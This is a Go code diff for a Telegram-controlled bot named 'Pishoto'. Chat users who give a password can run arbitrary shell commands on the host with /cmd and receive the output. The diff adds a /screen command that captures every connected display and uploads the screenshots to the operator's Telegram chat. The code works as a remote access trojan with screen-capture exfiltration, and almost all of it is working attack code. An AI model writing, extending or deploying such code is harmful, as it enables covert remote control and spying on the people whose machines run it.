@@ -10,9 +10,13 @@ import (
 	"strings"
 	"os/exec"
 	"net/http"
+	"image/png"
 	"crypto/md5"
 	"encoding/hex"
 	"encoding/json"
+	"mime/multipart"
+	"github.com/kbinani/screenshot"
+
 )
 
 var (
@@ -22,6 +26,7 @@ var (
 	botToken string
 	chatIDs  []int64
 	baseURL  = "https://api.telegram.org/bot" + botToken + "/"
+	sendfileURL = baseURL + "sendDocument"
 )
 
 // Message structure to handle Telegram API messages
@@ -95,6 +100,55 @@ func SendMessage(chatID int64, text string) error {
 	return nil
 }
 
+func sendDocument(chatID int64, fileName string, fileData []byte) error {
+	
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	// Add chatID to form data
+	err := writer.WriteField("chat_id", strconv.FormatInt(chatID, 10))
+	if err != nil {
+		return err
+	}
+
+	// Create form file
+	part, err := writer.CreateFormFile("document", fileName)
+	if err != nil {
+		return err
+	}
+
+	// Write file data to form file
+	_, err = part.Write(fileData)
+	if err != nil {
+		return err
+	}
+
+	err = writer.Close()
+	if err != nil {
+		return err
+	}
+
+	req, err := http.NewRequest("POST", sendfileURL, body)
+	if err != nil {
+		return err
+	}
+
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("unexpected status: %s", resp.Status)
+	}
+
+	return nil
+}
+
 func GetUpdates(offset int) (Response, error) {
 	url := baseURL + "getUpdates?offset=" + strconv.Itoa(offset)
 	resp, err := http.Get(url)
@@ -117,19 +171,57 @@ func GetUpdates(offset int) (Response, error) {
 	return response, nil
 }
 
-func executeCommand(commandParts []string) string {
+func takeScreenshots(chatID int64) {
+	n := screenshot.NumActiveDisplays()
+
+	for i := 0; i < n; i++ {
+		bounds := screenshot.GetDisplayBounds(i)
+
+		img, err := screenshot.CaptureRect(bounds)
+		if err != nil {
+			log.Printf("Error capturing screenshot: %v", err)
+			continue
+		}
+
+		// Create a buffer to store the image
+		var buf bytes.Buffer
+		err = png.Encode(&buf, img)
+		if err != nil {
+			log.Printf("Error encoding image: %v", err)
+			continue
+		}
+
+		fileName := fmt.Sprintf("screenshot_%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
+
+		// Send the image to Telegram
+		err = sendDocument(chatID, fileName, buf.Bytes())
+		if err != nil {
+			log.Printf("Error sending document: %v", err)
+			continue
+		}
+
+		fmt.Printf("Sent screenshot #%d : %v \"%s\"\n", i, bounds, fileName)
+	}
+}
+
+func executeCommand(chatID int64, commandParts []string) {
 
 	// Execute the command using the first element as the command and the rest as arguments
 	cmd := exec.Command(commandParts[0], commandParts[1:]...)
+	
+	// Will hold the response
+	responseStr := ""
 
 	// Get the combined output (stdout + stderr)
 	output, err := cmd.CombinedOutput()
 	if err != nil {
-		return fmt.Sprintf("error: %v", err)
+		responseStr = fmt.Sprintf("Error: %v", err)
+		responseStr += "\n" + string(output)
+	} else {
+	responseStr = string(output)
 	}
-
-	// Return the output as a string
-	return string(output)
+	// Send message to server
+	SendMessage(chatID, responseStr)
 }
 
 func parseCommand(text string, chatID int64) {
@@ -137,12 +229,16 @@ func parseCommand(text string, chatID int64) {
 	commandType := commandParts[0]
 	switch commandType {
 	case "/cmd":
-		output := executeCommand(commandParts[1:])
-		SendMessage(chatID, output)
+		executeCommand(chatID, commandParts[1:])
+	case "/screen":
+		takeScreenshots(chatID)
+	default:
+		SendMessage(chatID, "No such command 🥴")
 	}
 }
 
 func main() {
+
 	fmt.Println("Bot started. Press Ctrl+C to stop.")
 	offset := 0
 
@@ -161,7 +257,7 @@ func main() {
 			} else if md5Hash(text) == passMd5 {
 				fmt.Println("Password answered in Chat ID:", chatID)
 				chatIDs = append(chatIDs, chatID)
-				responseText := "Password confirmed. Pishoto is welcoming you :)"
+				responseText := "Password confirmed. Pishoto is welcoming you 🤖"
 				err := SendMessage(chatID, responseText)
 				if err != nil {
 					log.Fatalf("Error sending message: %v", err)
